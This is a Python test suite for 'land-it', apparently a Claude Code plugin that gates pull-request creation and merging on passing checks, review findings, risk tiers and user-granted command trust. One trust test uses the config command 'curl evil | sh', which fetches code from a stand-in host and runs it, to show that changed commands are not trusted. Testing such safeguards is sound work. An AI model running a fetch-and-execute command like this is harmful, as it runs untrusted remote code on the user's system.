"""Checks for bin/land-it against throwaway git repos: `python3 -m unittest discover tests`."""
import importlib.machinery
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bin", "land-it")
_loader = importlib.machinery.SourceFileLoader("land_it", BIN)
LI = importlib.util.module_from_spec(importlib.util.spec_from_loader("land_it", _loader))
_loader.exec_module(LI)


def sh(cwd, *cmd):
    return subprocess.run(cmd, cwd=cwd, check=True, capture_output=True, text=True).stdout


class Repo:
    def __init__(self, tc, cfg, trust=True):
        self._tmp, self._home = tempfile.TemporaryDirectory(), tempfile.TemporaryDirectory()
        tc.addCleanup(self._tmp.cleanup)
        tc.addCleanup(self._home.cleanup)
        self.root = os.path.realpath(self._tmp.name)
        sh(self.root, "git", "init", "-q", "-b", "main")
        sh(self.root, "git", "config", "user.email", "t@example.com")
        sh(self.root, "git", "config", "user.name", "t")
        if cfg is not None:
            self.write(".claude/land-it.json", json.dumps(cfg))
        self.write("a.py", "x = 1\n")
        self.commit("init")
        if cfg is not None and trust:
            self.trust()

    def trust(self):
        return self.hook("expand", command_name="land-it:trust")

    def write(self, rel, text):
        path = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(text)
        return path

    def commit(self, msg):
        sh(self.root, "git", "add", "-A")
        sh(self.root, "git", "commit", "-qm", msg)

    def cli(self, *args, stdin="", env=None):
        env = dict(os.environ, LAND_IT_HOME=self._home.name, **(env or {}))
        return subprocess.run([sys.executable, BIN, *args], cwd=self.root, input=stdin, capture_output=True, text=True,
                              env=env)

    def hook(self, event, **data):
        data.setdefault("cwd", self.root)
        data.setdefault("session_id", "s1")
        r = self.cli("hook", event, stdin=json.dumps(data))
        assert r.returncode == 0, r.stderr
        return json.loads(r.stdout) if r.stdout.strip() else None

    def edit(self, rel, text, session="s1"):
        path = self.write(rel, text)
        return self.hook("post-edit", session_id=session, tool_input={"file_path": path})

    def pr_create(self):
        out = self.hook("pre-bash", tool_input={"command": "git push -u origin HEAD && gh pr create --fill"})
        return out and out["hookSpecificOutput"]["permissionDecision"]


class Glob(unittest.TestCase):
    def test_semantics(self):
        yes = [("*.md", "README.md"), ("*.md", "docs/a.md"), ("docs/**", "docs/x/y.txt"),
               (".github/workflows/**", ".github/workflows/ci.yml"), ("src/*.py", "src/a.py"),
               ("*.{ts,tsx}", "web/b.tsx"), ("src/billing", "src/billing/pay.py"), ("src/billing/", "src/billing/x")]
        no = [("src/*.py", "src/x/a.py"), ("*.{ts,tsx}", "b.js"), ("docs/**", "src/docs.py"), ("a.py", "a.pyc")]
        for pat, path in yes:
            self.assertTrue(LI.matches(pat, path), (pat, path))
        for pat, path in no:
            self.assertFalse(LI.matches(pat, path), (pat, path))


class Gate(unittest.TestCase):
    def test_same_size_edit_right_after_commit_changes_tree(self):
        # regression: a copied index with a fresh mtime hid racy entries from git,
        # so an edit in the commit's second looked unchanged once the clock ticked over
        r = Repo(self, {})
        r.write("a.py", "x = 2\n")
        time.sleep(1.1)
        self.assertNotEqual(LI.worktree_tree(r.root), LI.head_tree(r.root))

    def test_pr_create_needs_stamp_on_head_tree(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        self.assertEqual(r.pr_create(), "deny")
        self.assertEqual(r.cli("check").returncode, 0)
        self.assertEqual(r.cli("stamp").returncode, 0, "clean tree = HEAD tree")
        self.assertIsNone(r.pr_create())
        r.write("a.py", "x = 2\n")
        r.commit("change after stamp")
        self.assertEqual(r.pr_create(), "deny", "a stamp covers one tree only")

    def test_stamp_requires_green_tree(self):
        r = Repo(self, {"checks": {"bad": "false"}})
        self.assertEqual(r.cli("check").returncode, 1)
        self.assertNotEqual(r.cli("stamp").returncode, 0)

    def test_uncommitted_stamp_becomes_valid_once_committed(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        r.write("b.py", "y = 1\n")
        r.cli("check")
        self.assertEqual(r.cli("stamp").returncode, 0)
        self.assertEqual(r.pr_create(), "deny", "stamped content isn't committed yet")
        r.commit("commit the stamped tree")
        self.assertIsNone(r.pr_create())

    def test_silent_without_config(self):
        r = Repo(self, None)
        self.assertIsNone(r.pr_create())
        self.assertIsNone(r.hook("stop"))


class StopHook(unittest.TestCase):
    def test_blocks_red_lets_go_on_green(self):
        r = Repo(self, {"checks": {"t": "test -f ok"}})
        self.assertIsNone(r.hook("stop"), "no edits this session: nothing to prove")
        self.assertIsNone(r.edit("a.py", "x = 3\n"))
        out = r.hook("stop")
        self.assertEqual(out["decision"], "block")
        self.assertIn("== t: FAIL", out["reason"])
        self.assertIsNone(r.hook("stop", stop_hook_active=True), "same red tree: Claude may stop to ask")
        r.edit("ok", "")
        self.assertIn("green", r.hook("stop")["systemMessage"])
        self.assertIsNone(r.hook("stop"), "dirty mark cleared")
        self.assertIsNone(r.hook("stop", session_id="other"), "other sessions untouched")

    def test_gives_up_after_cap(self):
        r = Repo(self, {"checks": {"t": "false"}})
        for i in range(LI.MAX_STOP_BLOCKS):
            r.edit("a.py", "x = %d\n" % i)
            self.assertEqual(r.hook("stop")["decision"], "block")
        r.edit("a.py", "x = -1\n")
        self.assertIn("over to you", r.hook("stop")["systemMessage"])

    def test_off_switch(self):
        r = Repo(self, {"checks": {"t": "false"}, "stop_gate": False})
        r.edit("a.py", "x = 9\n")
        self.assertIsNone(r.hook("stop"))


class OnEdit(unittest.TestCase):
    def test_failing_per_file_command_blocks(self):
        r = Repo(self, {"on_edit": {"*.py": "grep -q GOOD {file}"}})
        out = r.edit("a.py", "bad\n")
        self.assertEqual(out["decision"], "block")
        self.assertIn("a.py", out["reason"])
        self.assertIsNone(r.edit("a.py", "GOOD\n"))
        self.assertIsNone(r.edit("notes.txt", "bad\n"), "glob doesn't match")



def branch(r, name="feature"):
    sh(r.root, "git", "checkout", "-qb", name)


class Risk(unittest.TestCase):
    def test_tiers(self):
        cfg = {"risk": {"high": ["src/billing/**"], "low": ["src/gen/**", ".claude/land-it.json"]}}
        cases = {"README.md": "low", "docs/a/b.txt": "low", "src/a.py": "medium", "CLAUDE.md": "medium",
                 "src/billing/pay.py": "high", "src/gen/x.py": "low", ".github/workflows/ci.yml": "high",
                 ".claude/land-it.json": "high"}
        for path, tier in cases.items():
            self.assertEqual(LI.file_tier(path, cfg), tier, path)
        self.assertEqual(LI.classify([], cfg)[0], "low")
        self.assertEqual(LI.classify(["README.md", "src/a.py"], cfg)[0], "medium")

    def test_cli_counts_committed_uncommitted_and_untracked(self):
        r = Repo(self, {})
        branch(r)
        r.write("docs/guide.md", "hi\n")
        r.commit("docs")
        self.assertEqual(json.loads(r.cli("risk").stdout)["tier"], "low")
        r.write("src/new.py", "x = 1\n")
        out = json.loads(r.cli("risk").stdout)
        self.assertEqual(out["tier"], "medium")
        self.assertEqual(set(out["files"]), {"docs/guide.md", "src/new.py"})


    def test_review_effort_defaults_and_override(self):
        r = Repo(self, {"review_effort": {"high": "max"}})
        out = json.loads(r.cli("risk").stdout)["review_effort"]
        self.assertEqual(out, {"low": "low", "medium": "medium", "high": "max"})

class Rounds(unittest.TestCase):
    def test_diff_only_after_first_round_and_cap(self):
        r = Repo(self, {"max_rounds": 2})
        branch(r)
        first = json.loads(r.cli("round").stdout)
        self.assertEqual((first["round"], first["target"], first["over_cap"]), (1, "", False))
        self.assertTrue(json.loads(r.cli("round").stdout)["already_reviewed"], "same tree, same round")
        r.write("a.py", "x = 'fixed'\n")
        second = json.loads(r.cli("round").stdout)
        self.assertEqual(second["round"], 2)
        start, end = second["target"].split("..")
        self.assertEqual(sh(r.root, "git", "diff", "--name-only", start, end).split(), ["a.py"])
        r.write("a.py", "x = 'again'\n")
        self.assertTrue(json.loads(r.cli("round").stdout)["over_cap"])
        r.cli("round", "--reset")
        self.assertEqual(json.loads(r.cli("round").stdout)["round"], 1)


class Findings(unittest.TestCase):
    def test_pre_existing_dedupe_and_every_finding_answered(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write("a.py", "x = 1\ny = 2\n")
        r.commit("add y")
        found = [{"file": "a.py", "line": 1, "summary": "x is wrong"},
                 {"file": os.path.join(r.root, "a.py"), "line": "2", "summary": "y is wrong"}]
        added = json.loads(r.cli("findings", "add", stdin=json.dumps(found)).stdout)
        self.assertEqual([(f["id"], f["status"]) for f in added], [("F1", "pre-existing"), ("F2", "open")])
        again = json.loads(r.cli("findings", "add", stdin=json.dumps(found[1:])).stdout)
        self.assertEqual(again, [], "a finding is never posted twice")
        r.cli("check")
        refused = r.cli("stamp")
        self.assertNotEqual(refused.returncode, 0)
        self.assertIn("F2", refused.stderr)
        self.assertNotEqual(r.cli("findings", "resolve", "F2", "--status", "wontfix").returncode, 0, "needs a reason")
        self.assertEqual(r.cli("findings", "resolve", "F2", "--status", "wontfix", "--reason", "intended").returncode, 0)
        self.assertEqual(r.cli("stamp").returncode, 0)

    def test_stamp_tier_can_rise_never_drop(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write(".github/workflows/ci.yml", "on: push\n")
        r.cli("check")
        self.assertNotEqual(r.cli("stamp", "--tier", "low").returncode, 0)
        self.assertEqual(json.loads(r.cli("stamp", "--tier", "high").stdout)["tier"], "high")


class MergeGate(unittest.TestCase):
    def merge(self, r, cmd):
        out = r.hook("pre-bash", tool_input={"command": cmd})
        return out and out["hookSpecificOutput"]["permissionDecision"]

    def test_only_low_stamped_head_merges_without_a_human(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write("docs/a.md", "x\n")
        r.commit("docs")
        r.cli("check")
        r.cli("stamp")
        self.assertIsNone(self.merge(r, "gh pr merge --squash --delete-branch"))
        self.assertEqual(self.merge(r, "gh pr merge 12 --squash"), "ask", "another PR: can't vouch for it")
        r.write("src/a.py", "x\n")
        r.commit("code")
        r.cli("check")
        r.cli("stamp")
        self.assertEqual(self.merge(r, "gh pr merge --squash"), "ask", "medium needs a person")

    def test_agent_never_approves(self):
        r = Repo(self, {})
        self.assertEqual(self.merge(r, "gh pr review 5 --approve -b lgtm"), "deny")
        self.assertIsNone(self.merge(r, "gh pr review 5 --comment -b 'see line 3'"))
        self.assertIsNone(self.merge(r, "git status"))


class StopLowTier(unittest.TestCase):
    def test_docs_only_turn_skips_checks(self):
        r = Repo(self, {"checks": {"t": "false"}})
        r.edit("README.md", "words\n")
        self.assertIsNone(r.hook("stop"))



class Evals(unittest.TestCase):
    def setUp(self):
        self.r = r = Repo(self, {})
        r.write("a.py", "x = 1\ny = None\nz = 3\n")
        r.commit("bug lands on line 2")
        self.bug = sh(r.root, "git", "rev-parse", "HEAD").strip()
        r.write("b.py", "ok = True\n")
        r.commit("clean change")
        self.clean = sh(r.root, "git", "rev-parse", "HEAD").strip()
        add = r.cli("eval", "add", "--commit", self.bug, "--file", "a.py", "--line", "2", "--summary", "y is None")
        self.assertEqual(add.returncode, 0, add.stderr)
        self.assertEqual(r.cli("eval", "add", "--commit", self.clean, "--clean", "--id", "clean1").returncode, 0)
        r.write("REVIEW.md", "RULE-X\n")  # today's rules, uncommitted: the eval must use them

    def stub(self, on_bug, on_clean="Nothing to fix."):
        # a fake reviewer that only "sees" when the copied REVIEW.md is present
        return ("grep -q RULE-X REVIEW.md || exit 3; case {range} in *%s) echo '%s';; *) echo '%s';; esac"
                % (self.bug, on_bug, on_clean))

    def run_eval(self, *args):
        out = self.r.cli("eval", "run", *args)
        self.assertEqual(out.returncode, 0, out.stderr)
        return out.stdout

    def test_scores_and_verdicts(self):
        self.assertIn("baseline recorded", self.run_eval("--reviewer", self.stub("Important: a.py:2 y is None")))
        self.assertIn("no change", self.run_eval("--reviewer", self.stub("a.py:3 near the bug")))
        self.assertIn("more noise", self.run_eval("--reviewer", self.stub("a.py:2", "b.py:1 looks odd")))
        self.assertIn("worse", self.run_eval("--reviewer", self.stub("src/other.py:2")))
        with open(os.path.join(self.r.root, LI.EVAL_DIR, "history.jsonl")) as f:
            runs = [json.loads(ln) for ln in f]
        self.assertEqual([(x["recall"], x["noise"]) for x in runs], [(1.0, 0.0), (1.0, 0.0), (1.0, 1.0), (0.0, 0.0)])
        self.assertEqual(sh(self.r.root, "git", "worktree", "list").count("\n"), 1, "eval worktrees cleaned up")

    def test_only_is_not_recorded_and_errors_block_comparison(self):
        self.assertIn("not recorded", self.run_eval("--reviewer", self.stub("a.py:2"), "--only", "clean1"))
        self.assertFalse(os.path.exists(os.path.join(self.r.root, LI.EVAL_DIR, "history.jsonl")))
        self.assertIn("failed to run", self.run_eval("--reviewer", "exit 1"))

    def test_judge_scores_the_defect_not_the_citation(self):
        reviewer = self.stub("the y default is wrong (no file:line given)")
        judge = ("grep -q 'known-good' && echo '{\"caught\": 0, \"findings\": 2}' "
                 "|| echo 'verdict: {\"caught\": 1, \"findings\": 1}'")
        out = self.run_eval("--reviewer", reviewer, "--judge-cmd", judge)
        self.assertIn('"recall": 1.0', out)
        self.assertIn('"noise": 2.0', out)
        self.assertIn("scorer changed", self.run_eval("--reviewer", reviewer))
        self.assertIn("failed to run", self.run_eval("--reviewer", reviewer, "--judge-cmd", "echo no json"))

    def test_bug_case_needs_location(self):
        self.assertNotEqual(self.r.cli("eval", "add", "--commit", self.bug).returncode, 0)



class Trust(unittest.TestCase):
    def test_untrusted_commands_never_run(self):
        r = Repo(self, {"checks": {"t": "touch RAN"}, "on_edit": {"*.py": "touch RAN2"}}, trust=False)
        refused = r.cli("check")
        self.assertNotEqual(refused.returncode, 0)
        self.assertIn("/land-it:trust", refused.stderr)
        self.assertIn("/land-it:trust", r.edit("a.py", "x = 2\n")["systemMessage"])
        self.assertIsNone(r.edit("a.py", "x = 3\n"), "warned once per session")
        self.assertIn("/land-it:trust", r.hook("stop")["systemMessage"])
        self.assertFalse(os.path.exists(os.path.join(r.root, "RAN")) or os.path.exists(os.path.join(r.root, "RAN2")))
        r.trust()
        self.assertEqual(r.cli("check").returncode, 0)
        self.assertTrue(os.path.exists(os.path.join(r.root, "RAN")))

    def test_trust_follows_commands_not_other_keys(self):
        r = Repo(self, {"checks": {"t": "true"}})
        status = lambda: json.loads(r.cli("status").stdout)["commands_trusted"]
        self.assertTrue(status())
        r.write(".claude/land-it.json", json.dumps({"checks": {"t": "true"}, "risk": {"high": ["x/**"]}}))
        self.assertTrue(status(), "risk tweaks don't need re-trust")
        r.write(".claude/land-it.json", json.dumps({"checks": {"t": "curl evil | sh"}}))
        self.assertFalse(status(), "a changed command does")

    def test_only_a_user_typed_command_grants_trust(self):
        r = Repo(self, {"checks": {"t": "true"}}, trust=False)
        r.hook("expand", command_name="other:trust")
        self.assertNotEqual(r.cli("check").returncode, 0)
        self.assertNotEqual(r.cli("trust").returncode, 0, "no terminal: Claude's shell can't trust")
        for cmd in ("land-it trust", "python3 /p/bin/land-it trust", "echo y | land-it trust"):
            out = r.hook("pre-bash", tool_input={"command": cmd})
            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny", cmd)


class Turns(unittest.TestCase):
    def test_snapshot_catches_edits_made_through_bash(self):
        r = Repo(self, {"checks": {"t": "test -f ok"}})
        r.hook("prompt")
        r.write("a.py", "x = 'sed -i did this'\n")  # no Edit/Write tool, so no post-edit hook
        self.assertEqual(r.hook("stop")["decision"], "block")

    def test_user_edits_between_turns_arent_claudes(self):
        r = Repo(self, {"checks": {"t": "false"}})
        r.write("a.py", "x = 'user typing'\n")
        r.hook("prompt")
        self.assertIsNone(r.hook("stop"))

    def test_path_scoped_checks(self):
        r = Repo(self, {"checks": {"web": {"run": "false", "paths": ["web/**"]}, "api": {"run": "true", "paths": ["api/**"]}}})
        branch(r)
        r.write("api/x.py", "ok\n")
        out = r.cli("check")
        self.assertEqual(out.returncode, 0, out.stdout)
        self.assertIn("web: skipped", out.stdout)
        r.hook("prompt")
        r.write("api/y.py", "ok\n")
        self.assertIn("green", r.hook("stop")["systemMessage"])
        r.write("web/app.js", "x\n")
        self.assertEqual(r.cli("check").returncode, 1)



class Measure(unittest.TestCase):
    def commits_on_main(self, r, n, reverts):
        for i in range(n):
            msg = 'Revert "change %d"' % i if i < reverts else "change %d" % i
            sh(r.root, "git", "commit", "-q", "--allow-empty", "-m", msg)

    def test_circuit_breaker_raises_the_floor(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        self.commits_on_main(r, 20, reverts=2)  # 2 of 21 > 5%
        branch(r)
        r.write("docs/a.md", "x\n")
        out = json.loads(r.cli("risk").stdout)
        self.assertTrue(out["circuit_breaker"]["tripped"])
        self.assertEqual(out["tier"], "medium", "docs are low, the breaker lifts them one tier")
        r.cli("check")
        self.assertNotEqual(r.cli("stamp", "--tier", "low").returncode, 0)
        r.write(".claude/land-it.json", json.dumps({"checks": {"ok": "true"}, "circuit_breaker": False}))
        self.assertEqual(json.loads(r.cli("risk").stdout)["tier"], "high", "now the config itself changed")

    def test_breaker_needs_enough_history(self):
        r = Repo(self, {})
        self.commits_on_main(r, 3, reverts=2)
        self.assertFalse(json.loads(r.cli("risk").stdout)["circuit_breaker"]["tripped"])

    def test_stats_from_stamps(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r, "one")
        r.write("src/a.py", "a\n")
        r.cli("round")
        r.cli("findings", "add", stdin=json.dumps([{"file": "src/a.py", "line": 1, "summary": "bug"}]))
        r.cli("findings", "resolve", "F1", "--status", "fixed")
        r.cli("check")
        self.assertEqual(r.cli("stamp").returncode, 0)
        r.cli("stamp")  # a re-stamp of the same change counts once
        r.commit("one")
        branch(r, "two")
        r.write("src/b.py", "b\n")
        r.cli("round")
        r.write("src/b.py", "b2\n")
        r.cli("round")
        r.cli("check")
        r.cli("stamp")
        out = json.loads(r.cli("stats").stdout)
        self.assertEqual(out["preflight"]["changes"], 2)
        self.assertEqual(out["preflight"]["one_round_pct"], 50)
        self.assertEqual(out["preflight"]["mean_rounds"], 1.5)
        self.assertEqual((out["findings"]["total"], out["findings"]["fixed_pct"]), (1, 100))

    def test_github_human_time(self):
        r = Repo(self, {})
        bot, human = lambda login: {"__typename": "Bot", "login": login}, lambda login: {"__typename": "User", "login": login}
        prs = [{"title": "Add x", "createdAt": "2026-10-01T10:00:00Z", "mergedAt": "2026-10-01T12:00:00Z",
                "reviews": {"nodes": [{"author": human("alice"), "state": "APPROVED", "body": ""},
                                      {"author": bot("claude"), "state": "APPROVED", "body": "lgtm"}]},
                "comments": {"nodes": [{"author": human("bob")}, {"author": bot("claude")}]}},
               {"title": 'Revert "Add x"', "createdAt": "2026-10-02T00:00:00Z", "mergedAt": "2026-10-02T10:00:00Z",
                "reviews": {"nodes": [{"author": bot("claude"), "state": "APPROVED", "body": "ok"}]},
                "comments": {"nodes": []}}]
        fake = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, fake)
        with open(os.path.join(fake, "prs.json"), "w") as f:
            f.write("\n".join(json.dumps(pr) for pr in prs))  # what `gh api --jq '.nodes[]'` prints
        with open(os.path.join(fake, "gh"), "w") as f:
            f.write("#!/bin/sh\ncat '%s/prs.json'\n" % fake)
        os.chmod(os.path.join(fake, "gh"), 0o755)
        gh = json.loads(r.cli("stats", "--github", env={"PATH": fake + os.pathsep + os.environ["PATH"]}).stdout)["github"]
        self.assertEqual(gh["merged_prs"], 2)
        self.assertEqual(gh["merged_without_approval_pct"], 50, "the Claude app's approval doesn't count")
        self.assertEqual(gh["human_comments_per_pr"]["p95"], 1)
        self.assertEqual(gh["revert_prs_pct"], 50)
        self.assertEqual(gh["hours_to_merge"]["median"], 10.0)



FAKE_GH = """#!/usr/bin/env python3
import json, os, sys
args = sys.argv[1:]
with open(os.environ["GH_LOG"], "a") as f:
    f.write(json.dumps(args) + "\\n")
if args[:2] == ["pr", "view"]:
    print(42)
elif any("reviewThreads" in a for a in args):
    bot, human = {"__typename": "Bot", "login": "claude"}, {"__typename": "User", "login": "alice"}
    for t in [{"id": "T1", "isResolved": False, "isOutdated": False, "path": "a.py", "line": 2,
               "comments": {"nodes": [{"author": bot, "body": "Important: y is None", "url": "u1"}]}},
              {"id": "T2", "isResolved": True, "path": "a.py", "line": 1, "comments": {"nodes": [{"author": human, "body": "ok"}]}},
              {"id": "T3", "isResolved": False, "isOutdated": True, "path": "b.py", "line": 5,
               "comments": {"nodes": [{"author": human, "body": "why?", "url": "u3"}, {"author": bot, "body": "because"}]}}]:
        print(json.dumps(t))
elif any("addPullRequestReviewThreadReply" in a for a in args):
    print(json.dumps({"data": {"addPullRequestReviewThreadReply": {"comment": {"url": "https://example/reply"}}}}))
else:
    print(json.dumps({"data": {"resolveReviewThread": {"thread": {"isResolved": True}}}}))
"""


class GitHubLoop(unittest.TestCase):
    def setUp(self):
        self.r = Repo(self, {})
        self.fake = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.fake)
        with open(os.path.join(self.fake, "gh"), "w") as f:
            f.write(FAKE_GH)
        os.chmod(os.path.join(self.fake, "gh"), 0o755)
        self.log = os.path.join(self.fake, "log")
        self.env = {"PATH": self.fake + os.pathsep + os.environ["PATH"], "GH_LOG": self.log}

    def calls(self):
        with open(self.log) as f:
            return [json.loads(ln) for ln in f]

    def test_lists_only_unresolved_threads_for_this_branch_pr(self):
        out = json.loads(self.r.cli("threads", env=self.env).stdout)
        self.assertEqual(out["pr"], 42)
        self.assertEqual([(t["id"], t["bot"], t["replies"]) for t in out["unresolved"]], [("T1", True, 0), ("T3", False, 1)])
        self.assertIn("pr=42", self.calls()[-1])
        self.assertEqual(json.loads(self.r.cli("threads", "7", env=self.env).stdout)["pr"], 7)
        self.assertIn("pr=7", self.calls()[-1])

    def test_reply_and_resolve(self):
        out = json.loads(self.r.cli("threads", "reply", "T1", "--body", "Fixed in abc123", "--resolve", env=self.env).stdout)
        self.assertEqual(out, {"replied": "https://example/reply", "resolved": True})
        reply, resolve = self.calls()
        self.assertIn("body=Fixed in abc123", reply)
        self.assertTrue(any("resolveReviewThread" in a for a in resolve) and "id=T1" in resolve)

    def test_replying_always_asks_the_user(self):
        out = self.r.hook("pre-bash", tool_input={"command": "land-it threads reply T1 --body 'won't fix: intended'"})
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
        self.assertIsNone(self.r.hook("pre-bash", tool_input={"command": "land-it threads"}))


class Sweep(unittest.TestCase):
    def test_rotates_over_high_risk_areas(self):
        r = Repo(self, {"risk": {"high": ["src/billing/**", "src/auth/**", "*.sql", "src/none/**"]}})
        for path in ("src/billing/a.py", "src/auth/b.py", "db/x.sql"):
            r.write(path, "x\n")
        r.commit("areas")
        picks = [json.loads(r.cli("sweep-target", "--day", str(d)).stdout)["target"] for d in (0, 1, 2)]
        self.assertEqual(picks, ["src/auth", "src/billing", "src/auth"], "no-prefix and empty globs are skipped")

    def test_falls_back_to_top_level_dirs(self):
        r = Repo(self, {})
        for path in ("app/main.py", "docs/a.md", "tests/t.py", "lib/u.py"):
            r.write(path, "x\n")
        r.commit("dirs")
        out = json.loads(r.cli("sweep-target", "--day", "0").stdout)
        self.assertEqual((out["candidates"], out["from"]), (["app", "lib"], "top-level directories"))


class EvalScan(unittest.TestCase):
    def test_finds_reverts_not_yet_recorded(self):
        r = Repo(self, {})
        r.write("a.py", "x = 'bad'\n")
        r.commit("ship a bad change")
        bad = sh(r.root, "git", "rev-parse", "HEAD").strip()
        sh(r.root, "git", "revert", "--no-edit", "HEAD")
        found = json.loads(r.cli("eval", "scan").stdout)
        self.assertEqual([f["reverted"] for f in found], [bad])
        r.cli("eval", "add", "--commit", bad, "--file", "a.py", "--line", "1", "--summary", "bad value")
        self.assertEqual(json.loads(r.cli("eval", "scan").stdout), [])


if __name__ == "__main__":
    unittest.main()
